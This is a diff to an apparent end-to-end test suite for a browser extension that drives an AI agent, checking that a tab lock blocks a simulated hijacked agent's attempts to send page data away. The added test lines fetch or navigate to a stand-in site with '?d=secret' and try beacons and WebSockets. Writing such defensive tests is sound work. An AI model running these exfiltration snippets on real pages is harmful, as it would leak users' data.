@@ -1371,6 +1371,7 @@ const run = (code) => {
 const out = { tab };
 out.post = run('fetch("/e2e-post", { method: "POST", body: "hi" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
 out.get = run('fetch("/two.html").then((r) => r.status, (e) => "failed: " + e.message)');
+out.leak = run('fetch("http://localhost:" + location.port + "/e2e-leak?d=secret").then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
 out.beacon = run('navigator.sendBeacon("/e2e-beacon", "hi")');
 out.socket = run('new Promise((res) => { const w = new WebSocket("ws://" + location.host + "/e2e-socket"); w.onopen = () => res("open"); w.onerror = () => res("blocked"); setTimeout(() => res("no answer"), 3000); })');
 out.later = run('(setTimeout(() => fetch("/e2e-later", { method: "POST", body: "after the command" }), 1500), "put off")');
@@ -1412,10 +1413,13 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       if (String(said.tab) !== String(win.tabId)) throw new Error(`the stand-in got tab ${said.tab}, not ${win.tabId}: ${JSON.stringify(said)}`);
       if (!/^blocked/.test(said.post)) throw new Error(`the POST: ${said.post}`);
       if (said.get !== 200) throw new Error(`a GET should still work: ${said.get}`);
+      if (!/^blocked/.test(said.leak)) throw new Error(`the GET to another site: ${said.leak}`);
       if (said.socket === 'open') throw new Error('the WebSocket opened');
       if (said.later !== 'put off') throw new Error(`the put-off POST: ${said.later}`);
       await sleep(3000); // (past the put-off POST's 1.5 s)
       for (const p of ['/e2e-post', '/e2e-beacon', '/e2e-later', '/e2e-from-mod']) if (posted(p).length) throw new Error(`the test site received ${JSON.stringify(posted(p))}`);
+      const leaked = () => this.o.servers.requests.filter((q) => /^\/e2e-(leak|nav)/.test(q.url));
+      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
       if (this.o.servers.requests.some((q) => q.url.startsWith('/e2e-socket'))) throw new Error('the WebSocket reached the test site');
       // The panel says so, with a Reload button
       const lock = await waitFor('the lock notice', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? n.innerText : null; }`), { timeoutMs: 10000 });
@@ -1429,14 +1433,25 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       if (!held.facts.some((f) => /send requests or messages from the page as you \(it uses fetch\)/.test(f))) throw new Error(`the held facts: ${JSON.stringify(held)}`);
       if (!/The agent says: .render-only/.test(held.claim)) throw new Error(`the claim: ${held.claim}`);
       await this.shot(this.panelCtx, 'panel-hijack-held-and-locked');
-      // A reload: a new page, unlocked; a terminal's trif run (the user's) posts as before and locks nothing
-      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
-      await waitFor('the tab unlocked', () => this.panel(`async () => document.getElementById('tab-lock').hidden || null`), { timeoutMs: 10000 });
+      // Code left in the locked page sending the tab to another site with what it read: blocked (the
+      // tab shows the browser's blocked page); the panel's button takes it back to the page it was
+      // locked on, a new page: unlocked
+      const away = await this.cli(['run', '--tab', String(win.tabId), '(setTimeout(() => { location.href = "http://localhost:" + location.port + "/e2e-nav?d=secret"; }, 100), "sending it away")'], { timeoutMs: 30000 });
+      if (away.status !== 0) throw new Error(`trif run: ${away.stderr}`);
+      await sleep(2500);
+      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
+      await waitFor('the lock notice still up', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden || null; }`), { timeoutMs: 10000 });
+      await this.panel(`async () => { document.querySelector('#tab-lock button').click(); return true; }`);
+      await waitFor('the tab back on the test site', async () => {
+        const t = await this.ext(`async (id) => (await chrome.tabs.get(id)).url`, [win.tabId]);
+        return t && t.startsWith(base) ? t : null;
+      }, { timeoutMs: 15000 });
+      await waitFor('the tab unlocked', () => this.panel(`async () => document.getElementById('tab-lock').hidden || null`), { timeoutMs: 15000 });
       const t = await this.cli(['run', '--tab', String(win.tabId), 'fetch("/e2e-after", { method: "POST", body: "x" }).then((r) => r.status)'], { timeoutMs: 30000 });
       if (t.status !== 0) throw new Error(`trif run from a terminal: ${t.stderr}`);
       await waitFor('the terminal POST to arrive', () => posted('/e2e-after').length || null, { timeoutMs: 5000 });
       if (!(await this.panel(`async () => document.getElementById('tab-lock').hidden`))) throw new Error('a terminal trif run locked the tab');
-      return `POST ${said.post}; GET ${said.get}; beacon/later/socket never arrived; mod held: ${held.facts.join(' / ')}; unlocked by a reload`;
+      return `POST ${said.post}; GET ${said.get}; GET to another site ${said.leak}; beacon/later/socket/leaving for another site never arrived; mod held: ${held.facts.join(' / ')}; the panel's button brought the tab back, unlocked`;
     } finally {
       fs.writeFileSync(cfgFile, saved);
       try { fs.unlinkSync(modFile); } catch { /* not written */ }
@@ -1595,7 +1610,7 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       || (this.scriptsRevoked && /user scripts were turned off/.test(String(p.text))))
       // the hijacked agent's requests, which the tab lock blocked on purpose (hijackedAgentCheck)
       // (Firefox doesn't say which page: after that check, a failed fetch or socket is one of those)
-      || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket/i.test(String(p.text)));
+      || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket|e2e-leak|e2e-nav|blocked by|CORS/i.test(String(p.text) + String(p.source || '')));
     const problems = (await this.d.consoleProblems()).filter((p) => !expected(p));
     // The agent-made mod and the stand-in pages aren't ours to judge; everything else counts.
     const lines = problems.map((p) => `${p.level} [${p.from}] ${String(p.text).slice(0, 300)}${p.source ? ` (${String(p.source).slice(0, 120)})` : ''}`);
